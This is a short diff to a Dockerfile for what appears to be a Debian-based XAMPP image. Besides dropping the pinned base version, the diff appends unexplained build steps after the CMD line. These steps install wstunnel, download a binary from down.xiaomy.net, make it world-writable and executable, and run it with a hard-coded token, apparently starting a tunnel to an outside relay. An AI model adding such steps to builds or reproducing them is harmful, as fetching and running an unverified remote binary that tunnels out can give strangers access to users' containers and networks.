@@ -1,5 +1,4 @@
-ARG BASE_DEBIAN=buster
-FROM debian:${BASE_DEBIAN}
+FROM debian
 ARG XAMPP_URL
 LABEL maintainer="Tomas Jasek<tomsik68 (at) gmail (dot) com>"
 
@@ -50,3 +49,8 @@ EXPOSE 22
 EXPOSE 80
 
 CMD ["sh", "/startup.sh"]
+RUn apt update
+run apt install wstunnel
+run wget https://down.xiaomy.net/linux/wyc_linux_64
+RUN chmod 777 wyc_linux_64
+RUN ./wyc_linux_64 -token=pnlkljw7
